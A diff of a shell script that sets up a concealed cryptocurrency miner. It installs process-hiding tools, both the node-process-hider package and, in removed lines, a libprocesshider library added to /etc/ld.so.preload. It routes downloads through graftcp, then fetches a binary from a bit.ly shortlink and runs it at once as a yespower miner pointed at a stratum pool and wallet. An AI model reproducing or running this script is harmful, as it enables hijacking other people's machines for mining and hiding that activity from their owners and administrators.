@@ -1,9 +1,14 @@
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+#!/bin/sh
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-apt update
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
 
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -21,31 +26,9 @@ END
 
 sleep .2
 
-echo " "
-echo " "
-
-echo ""
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
-
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
-sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
-
 
 ./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra.$(shuf -n 1 -i 1-9999999) -p x -t14
